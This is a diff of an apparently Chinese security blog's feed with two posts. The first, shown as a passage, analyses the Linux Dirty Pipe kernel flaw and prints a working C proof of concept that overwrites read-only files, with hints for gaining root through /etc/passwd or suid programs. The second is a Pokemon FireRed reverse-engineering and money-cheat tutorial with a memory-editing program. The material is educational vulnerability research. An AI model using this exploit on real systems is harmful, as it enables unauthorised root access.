+	ret = wait_for_space(opipe, flags);
+	if (!ret)
+		ret = do_splice_to(in, offset, opipe, len, flags);
+	pipe_unlock(opipe);
+	if (ret &gt; 0)
+		wakeup_pipe_readers(opipe);
+	return ret;
+}
+</code></pre>
+<p>该函数会调用<code>do_splice_to</code> -&gt; <code>generic_file_splice_read</code> -&gt; <code>call_read_iter</code> -&gt; <code>ext4_file_read_iter</code> -&gt; <code>generic_file_read_iter</code> -&gt; <code>filemap_read</code> -&gt; <code>filemap_get_pages</code> -&gt; <code>copy_page_to_iter</code> -&gt; <code>__copy_page_to_iter</code> -&gt; <code>copy_page_to_iter_pipe</code></p>
+<pre><code class="language-c">static size_t copy_page_to_iter_pipe(struct page *page, size_t offset, size_t bytes,
+			 struct iov_iter *i)
+{
+	struct pipe_inode_info *pipe = i-&gt;pipe;
+	struct pipe_buffer *buf;
+	unsigned int p_tail = pipe-&gt;tail;
+	unsigned int p_mask = pipe-&gt;ring_size - 1;
+	unsigned int i_head = i-&gt;head;
+	size_t off;
+
+	if (unlikely(bytes &gt; i-&gt;count))
+		bytes = i-&gt;count;
+
+	if (unlikely(!bytes))
+		return 0;
+
+	if (!sanity(i))
+		return 0;
+
+	off = i-&gt;iov_offset;
+	buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask]; // 找到pipe bufs队列当前生产点的pipe_buffer
+	if (off) {
+		if (offset == off &amp;&amp; buf-&gt;page == page) {
+			/* merge with the last one */
+			buf-&gt;len += bytes;
+			i-&gt;iov_offset += bytes;
+			goto out;
+		}
+		i_head++;
+		buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];
+	}
+	if (pipe_full(i_head, p_tail, pipe-&gt;max_usage))
+		return 0;
+
+	buf-&gt;ops = &amp;page_cache_pipe_buf_ops;
+	get_page(page); // 增加该页框引用计数
+	buf-&gt;page = page; // 将pipe buffer的page指针指向该文件的物理页
+	buf-&gt;offset = offset;
+	buf-&gt;len = bytes;
+
+	pipe-&gt;head = i_head + 1;
+	i-&gt;iov_offset = offset + bytes;
+	i-&gt;head = i_head;
+out:
+	i-&gt;count -= bytes;
+	return bytes;
+}
+</code></pre>
+<p>该函数直接在pipe的缓冲区队列中建立了一个到目标文件页框的映射，相当于完成了一个从文件读取数据到管道的过程。</p>
+<p>值得注意的是在这个函数中并没有对<code>buf-&gt;flags</code>进行初始化，这也是该漏洞的重要成因。</p>
+<h2 id="利用手法">利用手法</h2>
+<ul>
+<li>首先创建一个pipe，利用pipe_write填满缓冲队列，使所有pipe_buffer的flags字段都具有<code>PIPE_BUF_FLAG_CAN_MERGE</code></li>
+<li>利用pipe_read清空缓冲队列，使splice调用能直接使用到初始化过flags的buffer，简化利用模型</li>
+<li>打开目标文件，使用<code>splice</code>系统调用将对应文件的页框映射到某个pipe_buffer上并写入至少1字节数据，不过要注意的是此时需要预留一定的位置来让下次对该buffer的pipe_read走<code>PIPE_BUF_FLAG_CAN_MERGE</code>这个分支来覆盖掉目标文件的内容。</li>
+<li>向管道写入数据，达成利用目标</li>
+</ul>
+<h3 id="poc">poc</h3>
+<pre><code class="language-c">#define _GNU_SOURCE
+#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;sys/stat.h&gt;
+#include &lt;sys/user.h&gt;
+
+#define PAGE_SIZE 4096
+
+int main(int argc, char **argv)
+{
+	if (argc != 4) {
+		printf(&quot;Usage: %s offset target_file data\n&quot;, argv[0]);
+		exit(0);
+	}
+	
+	loff_t offset = strtoul(argv[1], NULL, 0);
+	
+	int fd = open(argv[2], O_RDONLY);
+	struct stat fd_stat;
+	if (fd == -1) {
+		puts(&quot;[-] cannot open target file.&quot;);
+		exit(-1);
+	}
+	fstat(fd, &amp;fd_stat);
+	
+	const char *const data = argv[3];
+	const size_t data_size = strlen(data);
+	if (offset &gt; fd_stat.st_size
+		|| offset + data_size &gt; fd_stat.st_size
+		|| (offset % PAGE_SIZE) + data_size &gt; PAGE_SIZE) {
+		puts(&quot;[-] argv wriong.&quot;);
+		exit(-1);
+	}
+	
+	int pipe_fd[2];
+	pipe(pipe_fd);
+	
+	int pipe_size = fcntl(pipe_fd[1], F_GETPIPE_SZ);
+	char *buffer = (char *) malloc(PAGE_SIZE);
+	
+	for (unsigned r = pipe_size; r &gt; 0;) {
+		unsigned n = r &gt; sizeof(buffer) ? sizeof(buffer) : r;
+		write(pipe_fd[1], buffer, n);
+		r -= n;
+	}
+
+	for (unsigned r = pipe_size; r &gt; 0;) {
+		unsigned n = r &gt; sizeof(buffer) ? sizeof(buffer) : r;
+		read(pipe_fd[0], buffer, n);
+		r -= n;
+	}
+	
+	--offset; // read 1 bytes in splice()
+	splice(fd, &amp;offset, pipe_fd[1], NULL, 1, 0);
+	
+	if(write(pipe_fd[1], data, data_size) == data_size) {
+		puts(&quot;[+] success!&quot;);
+	}
+	
+	return 0;
+}
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/05/25/87c8bce3e502c.png" alt="1685016551639.png" loading="lazy"></figure>
+<p>成功修改只读文件</p>
+<h3 id="提权">提权</h3>
+<p>虽然只能读入不超过一张内存页的内容，且目标文件至少需要具有读权限，但实战中仍有大量文件是满足利用条件的。比如说往<code>/etc/passwd</code>中加入一个root权限的用户，或者劫持具有suid权限的程序来执行提权code。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[游戏安全初探: 从Pokemon火红开始]]></title>
+        <id>https://kotoriseed.github.io/post/pokemon-red/</id>
+        <link href="https://kotoriseed.github.io/post/pokemon-red/">
+        </link>
+        <updated>2023-03-19T13:13:36.000Z</updated>
+        <content type="html"><![CDATA[<blockquote>
+<p>一直都很想接触一下逆向相关的东西，但是技术太有限了，只能先从简单的方面入手</p>
+<p><del>你问我为什么从Pokemon FireRed开始？这可是爷的青春！</del></p>
+</blockquote>
+<h1 id="0x00-提取gba的binary">0x00 提取GBA的BINARY</h1>
+<p>在github上可以找到火红的整个项目代码：<a href="https://github.com/pret/pokefirered">https://github.com/pret/pokefirered</a></p>
+<p>这无疑是减少了巨量的逆向工作量，but更多的时候我们都需要从0开始，所以我还是打算从提取binary这一步做起。</p>
+<p>这里需要用到一个工具：<strong>no$gba</strong> ( Download：<a href="https://problemkaputt.github.io/gba.htm">https://problemkaputt.github.io/gba.htm</a> )</p>
+<figure data-type="image" tabindex="1"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/03/17/6efc45566ceac.png" alt="1679061233844.png" loading="lazy"></figure>
+<p>载入火红ROM的gba文件之后，转到0x08000000地址处，</p>
+<p>使用no$gba菜单栏的 Utility -&gt; Binarydump to .bin FILE, 输入0x01000000 (16MB, 火红ROM的大小)代表要提取这么多数据。</p>
+<p>接下来用ida打开，选择Processor type为<code>ARM Little-endian [ARM]</code></p>
+<figure data-type="image" tabindex="2"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/03/17/29ec5bc85627e.png" alt="1679061466938.png" loading="lazy"></figure>
+<p>然后从0x08000000处开始载入0x1000000个字节</p>
+<figure data-type="image" tabindex="3"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/03/17/a84bbb5decf58.png" alt="1679061521278.png" loading="lazy"></figure>
+<p>不过这个时候函数表还是空的，在IDA View-A视图中地址0x08000000的地方按p，就能分析出来很多函数了，并且也能正常反编译。</p>
+<figure data-type="image" tabindex="4"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/03/17/d16e8c9a42e89.png" alt="1679063200200.png" loading="lazy"></figure>
+<p>不过，直接这样看很难看出来这些函数究竟是在干什么，结合动调可能会好一些，但是效率任然会很低。</p>
+<p>结合该项目现有的资源，我又找到了他的符号表，</p>
+<p>(Download: <a href="https://raw.githubusercontent.com/pret/pokefirered/symbols/pokefirered.sym">https://raw.githubusercontent.com/pret/pokefirered/symbols/pokefirered.sym</a>)</p>
+<p>类似于如下的格式：</p>
+<pre><code>08000000 g 00000000 Start
+08000000 l 00000000 .text
+08000004 g 00000000 RomHeaderNintendoLogo
+080000a0 l 00000000 RomHeaderGameTitle
+080000ac g 00000000 RomHeaderGameCode
+080000b0 l 00000000 RomHeaderMakerCode
+080000b2 l 00000000 RomHeaderMagic
+080000b3 l 00000000 RomHeaderMainUnitCode
+080000b4 l 00000000 RomHeaderDeviceType
+080000b5 l 00000000 RomHeaderReserved1
+080000bc g 00000000 RomHeaderSoftwareVersion
+080000bd l 00000000 RomHeaderChecksum
+080000be l 00000000 RomHeaderReserved2
+080000c4 g 00000000 GPIOPortData
+080000c6 g 00000000 GPIOPortDirection
+080000c8 g 00000000 GPIOPortReadEnable
+08000100 l 00000000 .gcc2_compiled.
+08000100 l 00000104 sGFRomHeader
+08000204 g 00000000 start_vector
+08000238 l 00000000 sp_usr
+0800023c l 00000000 sp_irq
+08000248 g 00000000 intr_main
+0800031c l 00000000 loop
+08000320 l 00000000 jump_intr
+08000374 l 00000000 intr_return
+080003a4 g 0000010c AgbMain
+080003a4 l 00000000 .gcc2_compiled.
+080004b0 l 00000014 UpdateLinkAndCallCallbacks
+080004c4 l 0000004c InitMainCallbacks
+08000510 l 00000034 CallCallbacks
+08000544 g 00000014 SetMainCallback2
+
+......
+</code></pre>
+<p><del>有了符号表和源码，我们就可以为所欲为啦。</del></p>
+<p>至此，最基础的提取就告一段落了，后续将结合源码来看对它进行一些较为完整的逆向利用。</p>
+<h1 id="0x01-实现财富自由浅析money反作弊机制">0x01 实现财富自由——浅析Money反作弊机制</h1>
+<p>想要快速在一个游戏里获得快感，有一个朴素的方法就是暴富（）</p>
+<p>所以我们的第一步就是弄清楚这个游戏的金钱系统是如何运转的，以及如何破解游戏的反作弊来让自己实现财富自由。</p>
+<h2 id="初试">初试</h2>
+<p>一开始使用了最暴力的方法来尝试修改现金：CheatEngine内存扫描</p>
+<figure data-type="image" tabindex="5"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/03/18/965e36d320161.png" alt="1679119390931.png" loading="lazy"></figure>
+<p>但是事情远远没有这么简单，这个地址几乎就是储存金钱的地方，但是每次重新进行了获取金钱的行为之后，它都会被复原到之前的值。所以说为了防止我们直接扫描内存来找到存储金钱的地址，开发者进行了一定的反作弊工作。</p>
+<h2 id="分析">分析</h2>
+<p>在源码中找到了<strong>money.c</strong>（<del>不讲武德</del>），有以下几个函数可以关注</p>
+<pre><code class="language-c">#define MAX_MONEY 999999
+
+u32 GetMoney(u32 *moneyPtr)
+{
+    return *moneyPtr ^ gSaveBlock2Ptr-&gt;encryptionKey;
+}
+
+void SetMoney(u32 *moneyPtr, u32 newValue)
+{
+    *moneyPtr = gSaveBlock2Ptr-&gt;encryptionKey ^ newValue;
+}
+
+bool8 IsEnoughMoney(u32 *moneyPtr, u32 cost)
+{
+    if (GetMoney(moneyPtr) &gt;= cost)
+        return TRUE;
+    else
+        return FALSE;
+}
+
+void AddMoney(u32 *moneyPtr, u32 toAdd)
+{
+    u32 toSet = GetMoney(moneyPtr);
+
+    // can't have more money than MAX
+    if (toSet + toAdd &gt; MAX_MONEY)
+    {
+        toSet = MAX_MONEY;
+    }
+    else
+    {
+        toSet += toAdd;
+        // check overflow, can't have less money after you receive more
+        if (toSet &lt; GetMoney(moneyPtr))
+            toSet = MAX_MONEY;
+    }
+
+    SetMoney(moneyPtr, toSet);
+}
+
+void RemoveMoney(u32 *moneyPtr, u32 toSub)
+{
+    u32 toSet = GetMoney(moneyPtr);
+
+    // can't subtract more than you already have
+    if (toSet &lt; toSub)
+        toSet = 0;
+    else
+        toSet -= toSub;
+
+    SetMoney(moneyPtr, toSet);
+}
+</code></pre>
+<p>可以发现，程序通过<code>GetMoney</code>函数来计算出真实的金钱数，然后基于它实现了增加和减少金钱的函数。</p>
+<p>增加金钱的时候有一个上限<code>MAX_MONEY</code>, 他的值是999999，所以说游戏内最多只能有这么多钱。</p>
+<p>不难看出，反作弊的核心和我们利用的切入点都是GetMoney函数。</p>
+<h2 id="简单利用">简单利用</h2>
+<p>分析至此，有了几种利用思路。</p>
+<h3 id="道具是我的钱也是我的">道具是我的，钱也是我的</h3>
+<p>第一个便是从<code>RemoveMoney</code>入手，钱不够用的话，那就把扣钱也改成加钱！</p>
+<p>结合符号表，找到了RemoveMoney中扣钱的指令，在<code>0809FE00</code>这个位置，</p>
+<pre><code class="language-assembly">RAM:0809FE00                 CODE16
+RAM:0809FE00
+RAM:0809FE00 loc_809FE00                             ; CODE XREF: sub_809FDE8+12↑j
+RAM:0809FE00                 SUBS            R1, R1, R4
+RAM:0809FE02
+RAM:0809FE02 loc_809FE02                             ; CODE XREF: sub_809FDE8+16↑j
+RAM:0809FE02                 MOVS            R0, R5
+RAM:0809FE04                 BL              sub_809FD84
+RAM:0809FE08                 POP             {R4,R5}
+RAM:0809FE0A                 POP             {R0}
+RAM:0809FE0C                 BX              R0
+</code></pre>
+<p>我们把SUBS给patch成ADDS即可让所有开销都变成进账（）</p>
+<figure data-type="image" tabindex="6"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/03/18/ab552a4fbe287.png" alt="1679121580616.png" loading="lazy"></figure>
+<p>把<code>09 1B</code>改成<code>09 19</code>，然后去游戏里验证一下，</p>
+<figure data-type="image" tabindex="7"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/03/18/7aee07f95984f.png" alt="1679121651894.png" loading="lazy"></figure>
+<p>短短的几下购买，就赚得盆满钵满啦~</p>
+<blockquote>
+<p>上述方法其实是有一点不优美的，毕竟直接改掉了原本的游戏代码，改掉了代码之后，程序的hash值都已经发生了变化，万一你的小伙伴要求验证你的客户端hash值，一看就能发现客户端被篡改了，那么你再多的钱在他眼里也一文不值咯。</p>
+</blockquote>
+<h3 id="精准数值的修改">精准数值的修改</h3>
+<p>玩家的money是与4字节的<code>gSaveBlock2Ptr-&gt;encryptionKey</code>异或之后存在内存中的，所以也说明了为什么之前用CE没办法直接扫描出来。</p>
+<p>在很多函数中都能发现产生新encryptionKey并应用的代码，有一个思路是patch这个Random函数的返回值为0之类的固定值，不过这个方法任然有悖于不修改客户端的宗旨，所以并不继续尝试了。</p>
+<pre><code class="language-c">// create a new encryption key
+encryptionKey = (Random() &lt;&lt; 0x10) + (Random());
+ApplyNewEncryptionKeyToAllEncryptedData(encryptionKey);
+gSaveBlock2Ptr-&gt;encryptionKey = encryptionKey;
+</code></pre>
+<p>想要精准修改money，就需要把这个<strong>encryptionKey</strong>的值给得到。</p>
+<figure data-type="image" tabindex="8"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/03/18/63413f1038014.png" alt="1679125232239.png" loading="lazy"></figure>
+<p>通过动调，得到了这次的key是<code>0xAC728FDF</code>, 然后计算一下现在的钱加密后的值，试一下能不能在CE中找到</p>
+<p><strong>10816 ^ 0xAC728FDF</strong>得到<strong>2893194655</strong>, 果然，直接搜出来了。</p>
+<figure data-type="image" tabindex="9"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/03/18/3d8ecc49fd3a4.png" alt="1679125366858.png" loading="lazy"></figure>
+<p>尝试修改之后重新加密，成功将钱变成<code>114514</code>，</p>
+<figure data-type="image" tabindex="10"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/03/18/4abfc57b7d10d.png" alt="1679125543303.png" loading="lazy"></figure>
+<p>（不要在意为什么人物性转了，动调encryptionkey的时候找到了存档结构体，就试了一下改变性别）</p>
+<p>至此，我们已经能够通过纯手工的方法来任意修改金钱了（好耶）。</p>
+<p>（另外，通过对encryptionKey的交叉引用，可以发现在存储背包item和powder之类的功能中也使用了它来加密信息）</p>
+<figure data-type="image" tabindex="11"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/03/19/fbb77fe80c2d9.png" alt="1679200195333.png" loading="lazy"></figure>
+<blockquote>
+<p>不过，想要编写程序来自动化修改还有一定的难度，因为encryptionkey在内存中的地址并不固定，可能需要挖掘一下指针来帮助定位。</p>
+</blockquote>
+<h2 id="自动化修改money的一些尝试">自动化修改Money的一些尝试</h2>
+<p>加密金钱用的<code>encryptionKey</code>位于<code>SaveBlock2</code>这个结构体中，</p>
+<pre><code class="language-c">struct SaveBlock2
+{
+    /*0x000*/ u8 playerName[PLAYER_NAME_LENGTH + 1];
+    /*0x008*/ u8 playerGender; // MALE, FEMALE
+    /*0x009*/ u8 specialSaveWarpFlags;
+    /*0x00A*/ u8 playerTrainerId[TRAINER_ID_LENGTH];
+    /*0x00E*/ u16 playTimeHours;
+    /*0x010*/ u8 playTimeMinutes;
+    /*0x011*/ u8 playTimeSeconds;
+    /*0x012*/ u8 playTimeVBlanks;
+    /*0x013*/ u8 optionsButtonMode;  // OPTIONS_BUTTON_MODE_[NORMAL/LR/L_EQUALS_A]
+    /*0x014*/ u16 optionsTextSpeed:3; // OPTIONS_TEXT_SPEED_[SLOW/MID/FAST]
+              u16 optionsWindowFrameType:5; // Specifies one of the 20 decorative borders for text boxes
+    /*0x15*/  u16 optionsSound:1; // OPTIONS_SOUND_[MONO/STEREO]
+              u16 optionsBattleStyle:1; // OPTIONS_BATTLE_STYLE_[SHIFT/SET]
+              u16 optionsBattleSceneOff:1; // whether battle animations are disabled
+              u16 regionMapZoom:1; // whether the map is zoomed in
+    /*0x018*/ struct Pokedex pokedex;
+    /*0x090*/ u8 filler_90[0x8];
+    /*0x098*/ struct Time localTimeOffset;
+    /*0x0A0*/ struct Time lastBerryTreeUpdate;
+    /*0x0A8*/ u32 gcnLinkFlags; // Read by Pokemon Colosseum/XD
+    /*0x0AC*/ bool8 unkFlag1; // Set TRUE, never read
+    /*0x0AD*/ bool8 unkFlag2; // Set FALSE, never read
+    /*0x0B0*/ struct BattleTowerData battleTower;
+    /*0x898*/ u16 mapView[0x100];
+    /*0xA98*/ struct LinkBattleRecords linkBattleRecords;
+    /*0xAF0*/ struct BerryCrush berryCrush;
+    /*0xB00*/ struct PokemonJumpRecords pokeJump;
+    /*0xB10*/ struct BerryPickingResults berryPick;
+    /*0xB20*/ u8 filler_B20[0x400];
+    /*0xF20*/ u32 encryptionKey;
+}; // size: 0xF24
+
+extern struct SaveBlock2 *gSaveBlock2Ptr;
+</code></pre>
+<p>除此之外，还有一个同等重要的结构体<code>SaveBlock1</code></p>
+<pre><code class="language-c">struct SaveBlock1
+{
+    /*0x0000*/ struct Coords16 pos;
+    /*0x0004*/ struct WarpData location;
+    /*0x000C*/ struct WarpData continueGameWarp;
+    /*0x0014*/ struct WarpData dynamicWarp;
+    /*0x001C*/ struct WarpData lastHealLocation;
+    /*0x0024*/ struct WarpData escapeWarp;
+    /*0x002C*/ u16 savedMusic;
+    /*0x002E*/ u8 weather;
+    /*0x002F*/ u8 weatherCycleStage;
+    /*0x0030*/ u8 flashLevel;
+    /*0x0032*/ u16 mapLayoutId;
+    /*0x0034*/ u8 playerPartyCount;
+    /*0x0038*/ struct Pokemon playerParty[PARTY_SIZE];
+    /*0x0290*/ u32 money;
+    /*0x0294*/ u16 coins;
+    /*0x0296*/ u16 registeredItem; // registered for use with SELECT button
+    /*0x0298*/ struct ItemSlot pcItems[PC_ITEMS_COUNT];
+    /*0x0310*/ struct ItemSlot bagPocket_Items[BAG_ITEMS_COUNT];
+    /*0x03b8*/ struct ItemSlot bagPocket_KeyItems[BAG_KEYITEMS_COUNT];
+    /*0x0430*/ struct ItemSlot bagPocket_PokeBalls[BAG_POKEBALLS_COUNT];
+    /*0x0464*/ struct ItemSlot bagPocket_TMHM[BAG_TMHM_COUNT];
+    /*0x054c*/ struct ItemSlot bagPocket_Berries[BAG_BERRIES_COUNT];
+    /*0x05F8*/ u8 seen1[DEX_FLAGS_NO];
+    /*0x062C*/ u16 berryBlenderRecords[3]; // unused
+    /*0x0632*/ u8 unused_632[6];
+    /*0x0638*/ u16 trainerRematchStepCounter;
+    /*0x063A*/ u8 ALIGNED(2) trainerRematches[MAX_REMATCH_ENTRIES];
+    /*0x06A0*/ struct ObjectEvent objectEvents[OBJECT_EVENTS_COUNT];
+    /*0x08E0*/ struct ObjectEventTemplate objectEventTemplates[OBJECT_EVENT_TEMPLATES_COUNT];
+    /*0x0EE0*/ u8 flags[NUM_FLAG_BYTES];
+    /*0x1000*/ u16 vars[VARS_COUNT];
+    /*0x1200*/ u32 gameStats[NUM_GAME_STATS];
+    /*0x1300*/ struct QuestLog questLog[QUEST_LOG_SCENE_COUNT];
+    /*0x2CA0*/ u16 easyChatProfile[EASY_CHAT_BATTLE_WORDS_COUNT];
+    /*0x2CAC*/ u16 easyChatBattleStart[EASY_CHAT_BATTLE_WORDS_COUNT];
+    /*0x2CB8*/ u16 easyChatBattleWon[EASY_CHAT_BATTLE_WORDS_COUNT];
+    /*0x2CC4*/ u16 easyChatBattleLost[EASY_CHAT_BATTLE_WORDS_COUNT];
+    /*0x2CD0*/ struct Mail mail[MAIL_COUNT];
+    /*0x2F10*/ u8 additionalPhrases[NUM_ADDITIONAL_PHRASE_BYTES];
+    /*0x2F18*/ OldMan oldMan; // unused
+    /*0x2F54*/ struct DewfordTrend dewfordTrends[5]; // unused
+    /*0x2F80*/ struct DayCare daycare;
+    /*0x309C*/ u8 giftRibbons[GIFT_RIBBONS_COUNT];
+    /*0x30A7*/ struct ExternalEventData externalEventData;
+    /*0x30BB*/ struct ExternalEventFlags externalEventFlags;
+    /*0x30D0*/ struct Roamer roamer;
+    /*0x30EC*/ struct EnigmaBerry enigmaBerry;
+    /*0x3120*/ struct MysteryGiftSave mysteryGift;
+    /*0x348C*/ u8 unused_348C[400];
+    /*0x361C*/ struct RamScript ramScript;
+    /*0x3A08*/ struct RecordMixingGift recordMixingGift; // unused
+    /*0x3A18*/ u8 seen2[DEX_FLAGS_NO];
+    /*0x3A4C*/ u8 rivalName[PLAYER_NAME_LENGTH + 1];
+    /*0x3A54*/ struct FameCheckerSaveData fameChecker[NUM_FAMECHECKER_PERSONS];
+    /*0x3A94*/ u8 unused_3A94[64];
+    /*0x3AD4*/ u8 registeredTexts[UNION_ROOM_KB_ROW_COUNT][21];
+    /*0x3BA8*/ struct TrainerNameRecord trainerNameRecords[20];
+    /*0x3C98*/ struct DaycareMon route5DayCareMon;
+    /*0x3D24*/ u8 unused_3D24[16];
+    /*0x3D34*/ u32 towerChallengeId;
+    /*0x3D38*/ struct TrainerTower trainerTower[NUM_TOWER_CHALLENGE_TYPES];
+}; // size: 0x3D68
+</code></pre>
+<p><code>SaveBlock1</code>和<code>SaveBlock2</code>是当前以及后续利用需要重点关注的结构体。</p>
+<p>对<code>SaveBlock2</code>的分配，以及对<code>encryptionKey</code>的动态更新操作都在<strong>load_save.c</strong>中</p>
+<pre><code class="language-c">void SetSaveBlocksPointers(void)
+{
+    u32 offset;
+    struct SaveBlock1** sav1_LocalVar = &amp;gSaveBlock1Ptr;
+    void *oldSave = (void *)gSaveBlock1Ptr;
+
+    offset = (Random()) &amp; ((SAVEBLOCK_MOVE_RANGE - 1) &amp; ~3);
+
+    gSaveBlock2Ptr = (void *)(&amp;gSaveBlock2) + offset;
+    *sav1_LocalVar = (void *)(&amp;gSaveBlock1) + offset;
+    gPokemonStoragePtr = (void *)(&amp;gPokemonStorage) + offset;
+
+    SetBagPocketsPointers();
+    SetQuestLogRecordAndPlaybackPointers(oldSave);
+}
+
+void MoveSaveBlocks_ResetHeap(void)
+{
+    void *vblankCB, *hblankCB;
+    u32 encryptionKey;
+    struct SaveBlock2 *saveBlock2Copy;
+    struct SaveBlock1 *saveBlock1Copy;
+    struct PokemonStorage *pokemonStorageCopy;
+
+    // save interrupt functions and turn them off
+    vblankCB = gMain.vblankCallback;
+    hblankCB = gMain.hblankCallback;
+    gMain.vblankCallback = NULL;
+    gMain.hblankCallback = NULL;
+    gMain.vblankCounter1 = NULL;
+    
+    saveBlock2Copy = (struct SaveBlock2 *)(gHeap);
+    saveBlock1Copy = (struct SaveBlock1 *)(gHeap + sizeof(struct SaveBlock2));
+    pokemonStorageCopy = (struct PokemonStorage *)(gHeap + sizeof(struct SaveBlock2) + sizeof(struct SaveBlock1));
+
+    // backup the saves.
+    *saveBlock2Copy = *gSaveBlock2Ptr;
+    *saveBlock1Copy = *gSaveBlock1Ptr;
+    *pokemonStorageCopy = *gPokemonStoragePtr;
+
+    // change saveblocks' pointers
+    SetSaveBlocksPointers(); // unlike Emerald, this does not use
+                             // the trainer ID sum for an offset.
+
+    // restore saveblock data since the pointers changed
+    *gSaveBlock2Ptr = *saveBlock2Copy;
+    *gSaveBlock1Ptr = *saveBlock1Copy;
+    *gPokemonStoragePtr = *pokemonStorageCopy;
+
+    // heap was destroyed in the copying process, so reset it
+    InitHeap(gHeap, HEAP_SIZE);
+
+    // restore interrupt functions
+    gMain.hblankCallback = hblankCB;
+    gMain.vblankCallback = vblankCB;
+
+    // create a new encryption key
+    encryptionKey = (Random() &lt;&lt; 0x10) + (Random());
+    ApplyNewEncryptionKeyToAllEncryptedData(encryptionKey);
+    gSaveBlock2Ptr-&gt;encryptionKey = encryptionKey;
+}
+
+void ApplyNewEncryptionKeyToHword(u16 *hWord, u32 newKey)
+{
+    *hWord ^= gSaveBlock2Ptr-&gt;encryptionKey;
+    *hWord ^= newKey;
+}
+
+void ApplyNewEncryptionKeyToWord(u32 *word, u32 newKey)
+{
+    *word ^= gSaveBlock2Ptr-&gt;encryptionKey;
+    *word ^= newKey;
+}
+
+void ApplyNewEncryptionKeyToAllEncryptedData(u32 encryptionKey)
+{
+    int i;
+
+    for(i = 0; i &lt; NUM_TOWER_CHALLENGE_TYPES; i++)
+        ApplyNewEncryptionKeyToWord(&amp;gSaveBlock1Ptr-&gt;trainerTower[i].bestTime, encryptionKey);
+
+    ApplyNewEncryptionKeyToGameStats(encryptionKey);
+    ApplyNewEncryptionKeyToBagItems_(encryptionKey);
+    ApplyNewEncryptionKeyToBerryPowder(encryptionKey);
+    ApplyNewEncryptionKeyToWord(&amp;gSaveBlock1Ptr-&gt;money, encryptionKey);
+    ApplyNewEncryptionKeyToHword(&amp;gSaveBlock1Ptr-&gt;coins, encryptionKey);
+}
+</code></pre>
+<p>每次切换场景之后<code>gSaveBlock2</code>的位置都会变化，<code>encryptionKey</code>的值也会重新随机，对内存搜索造成了巨大的阻碍。（跳动指针反作弊）</p>
+<p>通过对GetMoney函数交叉引用，可以找到我们最终想要修改的moneyPtr位于<strong>gSaveBlock1</strong>中，对于encryptionKey，其实我们是没必要特地去leak的，如果知道了内存中存储money的地址，也知道我们现在已经拥有的money数量，就能直接计算出encryptionKey的值了。</p>
+<p>按道理来说，想要找到gSaveBlock1的位置，直接从<code>0x03005008</code>，也就是<strong>gSaveBlock1Ptr</strong>，这个地方来读就好了，但是我们利用的是内存搜索，并不能获取到这里的值，所以这里我还经过了几次动调，找到了在内存中的<code>0x028FE108</code>处会稳定出现gSaveBlock1的值，并且也能根据gSaveBlock1的值稳定调出money的位置。（but这个地址如果重新打开模拟器，也会变，所以想用这个还是有点折磨的，需要再次调出来一个地址。调试的具体过程我就不说了，并不是很麻烦）</p>
+<h3 id="代码">代码</h3>
+<pre><code class="language-c">#include &lt;windows.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+
+int main()
+{
+    HWND hwnd;
+    DWORD pid;
+    HANDLE process;
+
+    hwnd = FindWindow(NULL, TEXT(&quot;No$gba Debugger (Fullversion)&quot;));
+    if (hwnd == NULL) {
+        puts(&quot;window not found&quot;);
+        getchar();
+        exit(-1);
+    }
+
+    GetWindowThreadProcessId(hwnd, &amp;pid);
+    process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+
+    printf(&quot;[+] pid = %d\n&quot;, pid);
+
+    DWORD gSaveBlock1Ptr = 0x28fe108;
+    DWORD gSaveBlock1;
+    DWORD moneyPtr;
+    DWORD encryptionKey;
+    DWORD *buf_recv = (DWORD *)malloc(0x1000 * sizeof(DWORD));
+    DWORD moneyCur;  /* current money */
+    DWORD moneyChg;  /* money you want to change */
+    char tmp[0x20] = {};
+
+    int n = ReadProcessMemory(process, (PCVOID)gSaveBlock1Ptr, buf_recv, 8, 0);
+    gSaveBlock1 = buf_recv[0];
+    printf(&quot;[+] gSaveBlock1 addr: 0x%x\n&quot;, gSaveBlock1);
+
+    moneyPtr = gSaveBlock1 + 0x290 + 0x8b5100;
+    ReadProcessMemory(process, (PCVOID)moneyPtr, buf_recv, 4, 0);
+    printf(&quot;[+] money addr: 0x%x\n&quot;, moneyPtr);
+
+    puts(&quot;[+] how many money now: &quot;);
+    scanf(&quot;%s&quot;, tmp);
+    moneyCur = atoi(tmp);
+
+    encryptionKey = moneyCur ^ buf_recv[0];
+
+    puts(&quot;[+] new money: &quot;);
+    scanf(&quot;%s&quot;, tmp);
+    moneyChg = atoi(tmp);
+    moneyChg ^= encryptionKey;
+
+    int result = WriteProcessMemory(process, (LPVOID)moneyPtr, &amp;moneyChg, 4, 0);
+    if (result) {
+        puts(&quot;[+] Change succesfully!&quot;);
+    }
+
+    system(&quot;pause&quot;);
+
+    return 0;
+}
+</code></pre>
+<h3 id="效果图">效果图</h3>
+<p>我们现在有114514块钱，</p>
+<figure data-type="image" tabindex="12"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/03/18/bda0468fa9ea9.png" alt="1679139002443.png" loading="lazy"></figure>
+<p>输入现在的钱和想要得到的钱之后，在游戏里就能看到被成功修改了，也能正常花费出去。</p>
